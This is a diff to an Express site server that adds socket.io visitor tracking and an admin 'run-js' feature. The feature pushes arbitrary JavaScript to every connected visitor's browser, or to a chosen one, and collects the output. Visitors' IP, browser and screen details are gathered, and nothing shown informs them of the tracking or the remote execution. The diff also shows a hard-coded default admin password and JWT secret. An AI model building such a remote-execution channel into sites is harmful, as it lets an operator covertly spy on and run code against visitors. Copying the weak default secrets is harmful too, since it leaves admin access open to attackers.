@@ -4,7 +4,10 @@ const express = require("express");
 const fs = require("fs");
 const db = require("./db");
 const path = require("path");
+const http = require("http");
+const { Server } = require("socket.io");
 const app = express();
+const httpServer = http.createServer(app);
 const bcrypt = require("bcrypt");
 const jwt = require("jsonwebtoken");
 const cookieParser = require("cookie-parser");
@@ -27,6 +30,52 @@ app.set("views", path.join(__dirname, "views"));
 app.use(express.static(path.join(__dirname, "public")));
 app.use(express.json());
 
+const io = new Server(httpServer, {
+    path: "/socket.io",
+    serveClient: true
+});
+
+const liveClients = new Map();
+
+function parseCookieHeader(cookieHeader) {
+    const out = {};
+    String(cookieHeader || "").split(";").forEach(part => {
+        const i = part.indexOf("=");
+        if (i <= 0) return;
+        const key = decodeURIComponent(part.slice(0, i).trim());
+        const value = decodeURIComponent(part.slice(i + 1).trim());
+        out[key] = value;
+    });
+    return out;
+}
+
+function toClientSummary(socket, payload) {
+    const now = new Date().toISOString();
+    const forwarded = socket.handshake.headers["x-forwarded-for"];
+    const ip = (Array.isArray(forwarded) ? forwarded[0] : String(forwarded || socket.handshake.address || "")).split(",")[0].trim();
+    return {
+        id: socket.id,
+        ip,
+        userAgent: String(socket.handshake.headers["user-agent"] || ""),
+        connectedAt: now,
+        lastSeenAt: now,
+        page: String(payload.page || ""),
+        title: String(payload.title || ""),
+        referrer: String(payload.referrer || ""),
+        language: String(payload.language || ""),
+        screen: String(payload.screen || ""),
+        timezone: String(payload.timezone || ""),
+        visible: payload.visible !== false
+    };
+}
+
+function emitLiveSnapshot() {
+    io.to("admin-room").emit("live:snapshot", {
+        total: liveClients.size,
+        clients: Array.from(liveClients.values()).sort((a, b) => b.connectedAt.localeCompare(a.connectedAt)),
+        updatedAt: new Date().toISOString()
+    });
+}
 
 
 const { BetaAnalyticsDataClient } = require("@google-analytics/data");
@@ -763,6 +812,82 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "juegoscuenta";
 
 const JWT_SECRET = process.env.JWT_SECRET || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.example-signature";
 
+io.use((socket, next) => {
+    const role = String(socket.handshake.auth?.role || "client");
+    if (role !== "admin") return next();
+    const cookies = parseCookieHeader(socket.handshake.headers.cookie || "");
+    const token = cookies.admin_token;
+    if (!token) return next(new Error("unauthorized"));
+    try {
+        socket.admin = jwt.verify(token, JWT_SECRET);
+        return next();
+    } catch (error) {
+        return next(new Error("unauthorized"));
+    }
+});
+
+io.on("connection", socket => {
+    const role = String(socket.handshake.auth?.role || "client");
+
+    if (role === "admin") {
+        socket.join("admin-room");
+        emitLiveSnapshot();
+
+        socket.on("admin:run-js", payload => {
+            const body = payload && typeof payload === "object" ? payload : {};
+            const code = String(body.code || "").trim();
+            const target = String(body.target || "").trim();
+            if (!code) return;
+            const commandId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+            const data = { commandId, code };
+            if (target && target !== "all") {
+                io.to(target).emit("client:exec-js", data);
+            } else {
+                io.to("live-clients").emit("client:exec-js", data);
+            }
+            io.to("admin-room").emit("live:command", {
+                commandId,
+                target: target && target !== "all" ? target : "all",
+                sentAt: new Date().toISOString()
+            });
+        });
+        return;
+    }
+
+    const base = toClientSummary(socket, socket.handshake.auth || {});
+    liveClients.set(socket.id, base);
+    socket.join("live-clients");
+    emitLiveSnapshot();
+
+    socket.on("client:heartbeat", payload => {
+        const current = liveClients.get(socket.id);
+        if (!current) return;
+        const body = payload && typeof payload === "object" ? payload : {};
+        current.lastSeenAt = new Date().toISOString();
+        if (body.page !== undefined) current.page = String(body.page || "");
+        if (body.title !== undefined) current.title = String(body.title || "");
+        if (body.visible !== undefined) current.visible = body.visible !== false;
+        liveClients.set(socket.id, current);
+        emitLiveSnapshot();
+    });
+
+    socket.on("client:exec-result", payload => {
+        const body = payload && typeof payload === "object" ? payload : {};
+        io.to("admin-room").emit("live:exec-result", {
+            clientId: socket.id,
+            commandId: String(body.commandId || ""),
+            ok: Boolean(body.ok),
+            output: String(body.output || "").slice(0, 2000),
+            happenedAt: new Date().toISOString()
+        });
+    });
+
+    socket.on("disconnect", () => {
+        liveClients.delete(socket.id);
+        emitLiveSnapshot();
+    });
+});
+
 app.get("/admin", requireAdmin, async (req, res) => {
     const token = req.cookies.admin_token;
     
@@ -1296,6 +1421,6 @@ app.get("/admin/test-analytics", async (req, res) => {
 
 
 
-app.listen(process.env.PORT || 3000, () => {
+httpServer.listen(process.env.PORT || 3000, () => {
     console.log("SocialsForce funcionando.");
 });
